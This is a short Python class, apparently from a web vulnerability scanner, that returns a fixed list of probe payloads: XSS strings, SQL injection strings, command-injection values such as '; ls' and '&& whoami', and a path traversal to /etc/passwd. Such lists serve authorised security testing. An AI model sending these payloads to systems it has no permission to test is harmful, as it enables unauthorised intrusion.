class PayloadEngine:

    def generate(self, results):

        payloads = []

        tech = str(results.get("technologies", [])).lower()

        # -------------------------
        # XSS
        # -------------------------
        payloads.append("<script>alert(1)</script>")
        payloads.append("\"'><img src=x onerror=alert(1)>")

        # -------------------------
        # SQLi
        # -------------------------
        payloads.append("' OR 1=1--")
        payloads.append("' UNION SELECT NULL,NULL--")

        # -------------------------
        # Command Injection
        # -------------------------
        payloads.append("; ls")
        payloads.append("&& whoami")

        # -------------------------
        # LFI
        # -------------------------
        payloads.append("../../../../etc/passwd")

        return payloads